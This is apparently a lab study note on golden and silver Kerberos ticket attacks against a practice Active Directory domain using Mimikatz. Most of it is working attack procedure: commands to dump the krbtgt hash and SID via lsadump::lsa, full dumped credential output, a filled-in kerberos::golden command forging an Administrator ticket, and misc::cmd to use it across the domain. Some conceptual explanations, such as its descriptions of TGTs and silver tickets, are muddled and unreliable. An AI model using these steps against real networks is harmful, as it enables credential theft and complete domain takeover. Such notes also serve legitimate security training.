# Golden/Silver Tickets w/ Mimikatz 

- Use Mimikatz to create a silver ticket

A silver ticket can sometimes be better in engagement rather than golden ticket because it is a little more discreet.
- Silver ticket is limited to the service that is targeted
- Golden ticket has access to any Kerberos service

## Scenario
- Want to access domain's SQL server
- Current compromised user does not have access to that server
- Find accessible service account by Kerberoasting that service
- Dump the service hash of that account + impersonate TGT to request a service ticket for the SQL service
- Access to domain's SQL server

## KRBTGT Overview
### KRBTGT
- `Service account` for the KDC
- KDC is the `Key Distribution Centre` that issues all of the tickets to the clients
- If you impersonate this account and create a golden ticket, you give yourself the ability to create a service ticket for anything

### TGT
- Is a ticket to a service account issued by the KDC
- Can only access that service the TGT is from, such as SQL service ticket

### Golden/Silver Ticket Attack Overview
- Golden ticket works by dumping the ticket-granting-ticket of any user on domain
- Golden ticket; dumps the krbtgt ticket
- Silver ticket; dump any service or domain admin ticket

This will provide you with the service/domain admin account SID that is unique for each user account, as well as the NTLM hash. Use these details inisde of a Mimikatz goldent ticket to create a TGT that impersonates the given service account information.


<pre>privilege::debug</pre> 

- Dump the hash + SID needed to create a golden ticket

<pre>mimikatz# lsadump::lsa /inject /name:krbtgt

Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
 
 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad 
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d 
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef 
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt 
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
    </pre>

- To create a silver ticket, change the /name: to dump hash of either domain admin or service account

## Create Golden/Silver ticket
<pre>Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: </pre>

- Service NTLM hash into krbtgt : 72cd714611b64cd4d5550cd2759db3f6
- SID of service into SID : S-1-5-21-432953485-3795405108-1502158860
- ID 1103

<pre>mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-15021588
60  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103 
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 1103
Groups Id : *513 512 520 518 519
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
Lifetime  : 9/12/2023 1:41:37 PM ; 9/9/2033 1:41:37 PM ; 9/9/2033 1:41:37 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file ! </pre>

## Use Golden/Silver Ticket to access other machines
- Open elevated cmd prompt with the given ticket in Mimikatz
<pre>misc::cmd </pre>

- Access any machine on domain